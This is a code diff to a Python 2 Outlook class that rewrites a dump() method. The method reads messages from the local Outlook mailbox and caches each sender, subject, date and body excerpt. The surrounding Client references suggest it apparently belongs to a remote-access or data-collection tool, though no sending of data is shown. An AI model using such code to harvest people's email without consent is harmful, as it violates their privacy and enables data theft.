@@ -2376,16 +2376,23 @@ class Outlook():
         return json.dumps(Outlook.options, indent=2)
     
     def dump(self, n=1):
-        for i, email in enumerate(self.emails):
-            if i == n:
-                break
-            sender   = email.SenderEmailAddress.encode('ascii','ignore')
-            message  = email.Body.encode('ascii','ignore')[:150] + '...'
-            subject  = email.Subject.encode('ascii','ignore')
-            received = str(email.ReceivedTime).replace('/','-').replace('\\','').replace(':','-').replace(' ','_')
-            result   = {'date': received, 'from': sender, 'subject': subject, 'message': message}
-            self.cache.append(result)
-        return self.cache
+        n = 1 if bool(not n or not str(n).isdigit()) else int(n) 
+        i = 0
+        while i < n:
+            try:
+                email = self.emails.GetNext()
+                sender   = email.SenderEmailAddress.encode('ascii','ignore')
+                message  = email.Body.encode('ascii','ignore')[:150] + '...'
+                subject  = email.Subject.encode('ascii','ignore')
+                received = str(email.ReceivedTime).replace('/','-').replace('\\','').replace(':','-').replace(' ','_')
+                result   = {'date': received, 'from': sender, 'subject': subject, 'message': message}
+                self.cache.append(result)
+                i += 1
+                if int(i) >= int(n):
+                    break
+            except Exception as e:
+                Client.debug("{} error: {}".format(self.dump.func_name, str(e)))
+        return "Dumped %d emails from Outlook" % len(self.cache)
 
     def read(self, *args, **kwargs):
         for data in self.cache:
